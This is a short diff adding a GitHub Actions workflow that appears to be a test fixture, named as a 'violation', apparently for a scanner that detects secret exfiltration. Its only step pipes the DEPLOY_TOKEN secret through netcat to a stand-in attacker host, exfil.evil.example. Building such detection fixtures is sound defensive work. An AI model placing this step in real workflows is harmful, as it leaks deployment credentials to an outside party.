@@ -1,0 +1,9 @@
+name: violation_netcat_hostname
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          K: ${{ secrets.DEPLOY_TOKEN }}
+        run: nc exfil.evil.example 4444 <<< "$K"
